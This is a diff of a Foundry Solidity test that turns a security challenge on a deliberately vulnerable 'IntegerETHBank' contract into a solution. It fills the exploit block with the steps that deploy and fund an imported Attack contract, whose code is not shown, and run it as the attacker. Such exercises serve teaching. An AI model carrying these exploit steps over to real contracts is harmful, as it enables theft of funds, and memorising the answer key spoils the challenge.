@@ -4,10 +4,11 @@ pragma experimental ABIEncoderV2;
 
 import "forge-std/Test.sol";
 
-import "../src/IntegerETHBank.sol";
-import "./ExampleUser.sol";
+import "../../src/IntegerETHBank.sol";
+import "../ExampleUser.sol";
+import "./Attack.sol";
 
-contract IntegerETHBankTest is Test {
+contract IntegerETHBankSolution is Test {
     uint256 constant USER_INITIAL_ETH_BALANCE = 101 ether;
     uint256 constant ATTACKER_INITIAL_ETH_BALANCE = 1 ether;
 
@@ -34,6 +35,11 @@ contract IntegerETHBankTest is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        Attack attack = new Attack(address(integerETHBank));
+        address(attack).call{value: 1 ether}("");
+        attack.attack();
+        attackContract = address(attack);
         /**
          * EXPLOIT END *
          */
